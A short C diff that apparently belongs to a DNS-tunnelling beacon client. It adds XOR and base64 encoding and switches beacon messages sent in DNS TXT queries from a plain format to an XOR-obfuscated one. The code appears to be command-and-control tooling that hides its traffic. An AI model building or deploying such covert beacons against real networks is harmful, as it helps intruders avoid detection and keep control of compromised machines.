@@ -9,6 +9,7 @@
 #include<unistd.h>    //getpid
 
 #include "messagetypes.h"
+#include "base64.c"
 #define UUID 0xffff
  
 char dns_servers[10][100];
@@ -97,6 +98,12 @@ typedef struct
     unsigned char *name;
     struct QUESTION *ques;
 } QUERY;
+
+void xor(char b, char * string, int string_len) {
+    int i;
+    for(i=0; i<string_len;i++)
+        string[i] ^= b;
+}
  
 int main( int argc , char *argv[])
 {
@@ -117,7 +124,8 @@ int main( int argc , char *argv[])
     // Append the Beacon
     struct Beacon *beacon = NULL;
     beacon = (struct Beacon*)malloc(sizeof(struct Beacon));
-    beacon->type = (FORMAT_PLAIN << 4) | BEACON_PING;
+    //beacon->type = (FORMAT_PLAIN << 4) | BEACON_PING;
+    beacon->type = (FORMAT_XOR << 4) | BEACON_PING;
     beacon->uuid = UUID;
     ngethostbyname(hostname, T_TXT, beacon, 3);
  
